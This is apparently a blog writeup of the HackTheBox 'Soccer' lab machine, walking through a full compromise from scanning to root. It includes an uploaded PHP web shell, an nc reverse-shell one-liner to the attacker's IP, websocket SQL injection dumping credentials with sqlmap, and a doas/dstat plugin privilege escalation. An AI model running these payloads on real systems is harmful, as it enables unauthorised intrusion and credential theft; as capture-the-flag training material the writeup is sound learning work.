---
layout: single
title: Soccer hackthebox writeup
excerpt: "Easy linux machine in which we upload malicious files, we do a sqli in a websocket and privesc thanks to doas and dstat"
date: 2022-12-27
classes: wide
header:
  teaser: /assets/images/soccer/soccer_icon.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - writeup
tags:
  - hackthebox
  - fuzzing
  - MySQL
  - SQL injection
  - websocket
  - doas
---

![](/assets/images/soccer/soccer.png)

## User Flag

```shell
 nmap -sS -p- -n -Pn --min-rate 5000 -vv 10.10.11.194

PORT     STATE SERVICE        REASON
22/tcp   open  ssh            syn-ack ttl 63
80/tcp   open  http           syn-ack ttl 63
9091/tcp open  xmltec-xmlmail syn-ack ttl 63
```

At first finding port 9091 open was a little bit confusing however, let's focus on port 80 as usual. On the main page nothing really meaningful shows so I started fuzzing. (As always add the url to your `/etc/hosts`)

```shell
ffuf -w ~/wordlist/directory-list-2.3-big.txt  -u http://soccer.htb/FUZZ -v -t 200

[Status: 301, Size: 178, Words: 6, Lines: 8]
| URL | http://soccer.htb/tiny
| --> | http://soccer.htb/tiny/
    * FUZZ: tiny

```

Now we have a login page but none of our login bypass techniques seems to work (sqli,nosqli,ldap...) so I searched for `tiny file manager` to see if it had a github repo or something similar and it did. In [this part of the repo](https://github.com/prasathmani/tinyfilemanager#:~:text=Default%20username/password%3A%20admin/admin%40123%20and%20user/12345.) we have the default credentials, let's try these out.

Now that we logged in if you search for exploits you may find a couple however, we do not need them since we can just create our own directory and upload our files. If you go to `/tiny/uploads` you can create a new directory by pressing the `New item` button. Just create a folder and upload some malicious files to get reverse shell access. In my case I uploaded 2 files, `cmd.php`& `shell.sh`, and set the `shell.sh` perms to executable.


```shell
#cmd.php
<?php system($_REQUEST['cmd']); ?>
```

```shell
#shell.sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.14.52 7777 >/tmp/f
```

Now by visiting the url `http://soccer.htb/tiny/uploads/test/file.php?cmd=bash%20./shell.sh` and opening a port we have reverse shell access.

```shell
 nc -lvp 7777
Connection from 10.10.11.194:52058
bash: cannot set terminal process group (1041): Inappropriate ioctl for device
bash: no job control in this shell
www-data@soccer:~/html/tiny/uploads/test$ python3 -c 'import pty; pty.spawn("/bin/bash")'
<st$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@soccer:~/html/tiny/uploads/test$ ^Z
zsh: suspended  nc -lvp 7777
[dasor@archlinux ~]$  stty raw -echo;fg
[1]  + continued  nc -lvp 7777
                              script /dev/null -c bash
Script started, file is /dev/null
www-data@soccer:~/html/tiny/uploads/test$ export TERM=xterm
www-data@soccer:~/html/tiny/uploads/test$ stty rows 30 columns 132
www-data@soccer:~/html/tiny/uploads/test$
```

Once we have a comfortable environment to work with it's time to start searching how to privesc to user player. By going through the nginx config files we found a new subdomain

```shell
cd /etc/nginx/sites-enabled/
www-data@soccer:/etc/nginx/sites-enabled$ ls
default  soc-player.htb
```

We can visit it by adding it to our `/etc/hosts`. If we create a user we will be able to use the ticketing functionality and If you intercept that request with burpsuite you will find that is going to a WebSocket in port 9091. This is vulnerable to sql injection. just try the payload `1 union select 1,2,3` and it will return ticket exists. However, we can't manually dump the database but `sqlmap` can do it for us with time-based injections. Nevertheless, sqlmap doesn't have any well-documented option to attack web sockets so I'm going to use a tool created by [Rayhan0x01](https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html). Once we have the tool ready let's use it. (This is going to take so time since it is a time-based injection)

```shell
[dasor@archlinux ~/htb/soccer]$ python3 middleware.py
[+] Starting MiddleWare Server
[+] Send payloads in http://localhost:8081/?id=*
...
[dasor@archlinux ~/htb/soccer]$ sqlmap -u http://localhost:8081/?id=1 --dbs
---
Parameter: id (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 5641 FROM (SELECT(SLEEP(5)))NSUp)
---
[12:21:18] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n]
[12:21:52] [INFO] adjusting time delay to 1 second due to good response times
available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] soccer_db
[*] sys
```

Let's now check the tables of the DB soccer_db

```shell
sqlmap -u http://localhost:8081/?id=1 -D soccer_db --tables
Database: soccer_db
[1 table]
+----------+
| accounts |
+----------+
```

Then the columns

```shell
sqlmap -u http://localhost:8081/?id=1 -D soccer_db -T accounts --columns
Database: soccer_db
Table: accounts
[4 columns]
+----------+-------------+
| Column   | Type        |
+----------+-------------+
| email    | varchar(40) |
| id       | int         |
| password | varchar(40) |
| username | varchar(40) |
+----------+-------------+
```

Lastly let's dump both of the colummns password and username.

```shell
Database: soccer_db
Table: accounts
[1 entry]
+----------------------+----------+
| password             | username |
+----------------------+----------+
| PlayerOftheMatch2022 | player   |
+----------------------+----------+
```

At this point we can get the user flag.

```shell
su player
Password:
player@soccer:/etc/nginx/sites-enabled$ cd
player@soccer:~$ ls
user.txt
```

## Root flag

Now by doing the usual privesc checklist we find something interesting if we search for SUID binaries.

```shell
player@soccer:~$ find / -perm -4000 2>/dev/null
/usr/local/bin/doas
...
```

doas is a tool similar to sudo and that I actually use in some of my computers so I checked it's config file.

```shell
player@soccer:~$ cat $(find / -iname doas.conf 2>/dev/null)
permit nopass player as root cmd /usr/bin/dstat
```

Basically, the config file implies that we are allowed to execute dstat as root without a password. By checking `dstat -h` we see it can load python plugins but we can't write in the plugins directory

```shell
player@soccer:~$ doas /usr/bin/dstat --list
internal:
        aio,cpu,cpu-adv,cpu-use,cpu24,disk,disk24,disk24-old,epoch,fs,int,int24,io,ipc,load,lock,mem,mem-adv,
        net,page,page24,proc,raw,socket,swap,swap-old,sys,tcp,time,udp,unix,vm,vm-adv,zones
/usr/share/dstat:
        battery,battery-remain,condor-queue,cpufreq,dbus,disk-avgqu,disk-avgrq,disk-svctm,disk-tps,disk-util,disk-wait,
        dstat,dstat-cpu,dstat-ctxt,dstat-mem,fan,freespace,fuse,gpfs,gpfs-ops,helloworld,ib,innodb-buffer,innodb-io,
        innodb-ops,jvm-full,jvm-vm,lustre,md-status,memcache-hits,mongodb-conn,mongodb-mem,mongodb-opcount,mongodb-queue,
        mongodb-stats,mysql-io,mysql-keys,mysql5-cmds,mysql5-conn,mysql5-innodb,mysql5-innodb-basic,mysql5-innodb-extra,
        mysql5-io,mysql5-keys,net-packets,nfs3,nfs3-ops,nfsd3,nfsd3-ops,nfsd4-ops,nfsstat4,ntp,postfix,power,
        proc-count,qmail,redis,rpc,rpcd,sendmail,snmp-cpu,snmp-load,snmp-mem,snmp-net,snmp-net-err,snmp-sys,snooze,
        squid,test,thermal,top-bio,top-bio-adv,top-childwait,top-cpu,top-cpu-adv,top-cputime,top-cputime-avg,top-int,
        top-io,top-io-adv,top-latency,top-latency-avg,top-mem,top-oom,utmp,vm-cpu,vm-mem,vm-mem-adv,vmk-hba,vmk-int,
        vmk-nic,vz-cpu,vz-io,vz-ubc,wifi,zfs-arc,zfs-l2arc,zfs-zil

```

But if we look deeply into the manual we can find the last step.


```shell
       Paths that may contain external dstat_*.py plugins:

           ~/.dstat/
           (path of binary)/plugins/
           /usr/share/dstat/
           /usr/local/share/dstat/
```

We have write permissions on `/usr/local/share/dstat` so by creating a simple script we can get root


```shell
player@soccer:/usr/local/share/dstat$ cat > dstat_shell.py
import os;
os.system("bash")
^C
player@soccer:/usr/local/share/dstat$ ls
dstat_shell.py
player@soccer:/usr/local/share/dstat$ doas /usr/bin/dstat --shell
/usr/bin/dstat:2619: DeprecationWarning: the imp module is deprecated in favour of importlib; see the module's documentation for alternative uses
  import imp
root@soccer:/usr/local/share/dstat# whoami
root
```
